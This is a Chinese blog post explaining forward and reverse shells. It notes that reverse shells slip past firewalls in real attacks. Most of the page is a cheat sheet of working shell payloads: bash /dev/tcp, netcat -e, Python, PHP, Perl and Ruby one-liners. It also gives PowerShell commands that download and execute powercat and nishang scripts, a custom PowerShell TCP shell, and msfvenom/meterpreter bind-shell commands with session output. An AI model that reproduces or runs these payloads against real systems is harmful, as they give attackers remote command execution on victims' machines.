<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>shell的正向和反向 - 菜鸟程序员博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="shell的正向和反向" />
<meta property="og:description" content="正向shell和反向shell
正向shell：控制端主动发起连接去连接被控制端
反向shell：被控制端主动连接控制端
在实战中，大多数采用反向shell，因为正向shell有很多因素导致连接失败，
比如说硬件设备有防火墙，入侵防御系统等，还有网站防火墙，端口占用，权限不足等场景，特别是硬件设备如果你正向连接被防火墙拦截导致打草惊蛇，后期攻击相当繁琐。
反向shell：而被控制端主动向外发送的数据包通常都不会被拦截。
反向shell如下
Linux常见反向shell
bash反弹shell
nc -lvp 4444 bash -i&gt;&amp; /dev/tcp/192.168.11.12/4444 0&gt;&amp;1 nc反弹shell
nc -lvp 4444 nc 192.168.11.12 666 /bin/bash |nc 192.168.11.12 666 nc 192.168.11.12 999 -e /bin/bash Linux python反弹shell
nc -lvp 9999 python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;192.168.11.12&#34;,9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39; PHP反弹shell
nc -lvp 6666 php -r &#39;$sock=fsockopen(&#34;192.168.11.12&#34;,6666);exec(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39; Perl反弹shell
perl -e &#39;use Socket; $i=&#34;192.168.11.12&#34;;$p=7777;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#34;tcp&#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&#34;&gt;&amp;S&#34;);open(STDOUT,&#34;&gt;&amp;S&#34;);open(STDERR,&#34;&gt;&amp;S&#34;);exec(&#34;/bin/sh -i&#34;);};&#39; ruby反弹shell
nc -lvp 4444 ruby -rsocket -e&#39;f=TCPSocket.open(&#34;192.168.11.12&#34;,4444).to_i;exec sprintf(&#34;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&#34;" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://cainiaoprogram.github.io/posts/5e12744da941b477e5a2bdd991718f61/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-02-05T13:59:16+08:00" />
<meta property="article:modified_time" content="2022-02-05T13:59:16+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="菜鸟程序员博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">菜鸟程序员博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">shell的正向和反向</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-dark">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <p><strong>正向shell和反向shell</strong><br> 正向shell：控制端主动发起连接去连接被控制端<br> 反向shell：被控制端主动连接控制端<br> 在实战中，大多数采用反向shell，因为正向shell有很多因素导致连接失败，<br> 比如说硬件设备有防火墙，入侵防御系统等，还有网站防火墙，端口占用，权限不足等场景，特别是硬件设备如果你正向连接被防火墙拦截导致打草惊蛇，后期攻击相当繁琐。<br> 反向shell：而被控制端主动向外发送的数据包通常都不会被拦截。</p> 
<p><strong>反向shell如下</strong></p> 
<p><strong>Linux常见反向shell</strong><br> bash反弹shell</p> 
<pre><code>nc -lvp 4444
bash -i&gt;&amp; /dev/tcp/192.168.11.12/4444 0&gt;&amp;1
</code></pre> 
<p>nc反弹shell</p> 
<pre><code>nc -lvp 4444   

nc 192.168.11.12 666 
/bin/bash |nc 192.168.11.12 666
nc 192.168.11.12 999 -e /bin/bash  Linux
</code></pre> 
<p>python反弹shell</p> 
<pre><code>nc -lvp 9999 
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.11.12",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
</code></pre> 
<p>PHP反弹shell</p> 
<pre><code>nc -lvp 6666
php -r '$sock=fsockopen("192.168.11.12",6666);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'
</code></pre> 
<p>Perl反弹shell</p> 
<pre><code>perl -e 'use Socket; $i="192.168.11.12";$p=7777;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'
</code></pre> 
<p>ruby反弹shell</p> 
<pre><code>nc -lvp 4444
ruby -rsocket -e'f=TCPSocket.open("192.168.11.12",4444).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'
</code></pre> 
<p><strong>Windows反弹shell如下</strong></p> 
<p>powercat反弹shell<br> powercat（https://github.com/besimorhino/powercat ）为Powershell版的Netcat，</p> 
<pre><code>nc -vlp 6666 
powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 192.168.11.12 -p 6666 -e cmd
</code></pre> 
<p>nishang反弹shell<br> Nishang(https://github.com/samratashok/nishang )是一个基于PowerShell的攻击框架，<br> 集合了一些PowerShell攻击脚本和有效载荷，可反弹TCP/ UDP/ HTTP/HTTPS/ ICMP等类型shell。</p> 
<pre><code>nc -lvp 6666
powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.11.12 -port 6666
</code></pre> 
<p>自定义powershell函数反弹shell</p> 
<pre><code>nc -lvp 6666
powershell -nop -c "$client = New-Object Net.Sockets.TCPClient('192.168.11.12',6666);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
</code></pre> 
<p><strong>正向shell如下</strong><br> nc 正向shell</p> 
<pre><code>nc -lvp 8080 -e /bin/bash   
nc 192.168.11.11 8080	
</code></pre> 
<p>msf木马正向shell</p> 
<pre><code>msfvenom -p windows/meterpreter/bind_tcp -f exe LPORT=80 -o shell.exe

msf6 &gt; use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) &gt; set payload windows/meterpreter/bind_tcp
payload =&gt; windows/meterpreter/bind_tcp
msf6 exploit(multi/handler) &gt; set lport  80
lport =&gt; 80
msf6 exploit(multi/handler) &gt; set rhost 192.168.1.108
rhost =&gt; 192.168.1.108
msf6 exploit(multi/handler) &gt; run

[*] Started bind TCP handler against 192.168.1.108:80
[*] Sending stage (175174 bytes) to 192.168.1.108
[*] Meterpreter session 1 opened (192.168.11.12:33071 -&gt; 192.168.1.108:80 ) at 2022-02-01 20:28:13 +0800

meterpreter &gt; 



msf，payload模块
set payload windows/meterpreter/bind_tcp			正向
set payload windows/x64/meterpreter/reverse_tcp  	反向   
</code></pre>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/615f7576a04f9173827aa437e002db8f/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">【技术年货】字节技术年货篇</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/19f94379d3d8eb5b6ed827fea1bfd42a/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">linux脚本批量解压到同名目录</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 菜鸟程序员博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>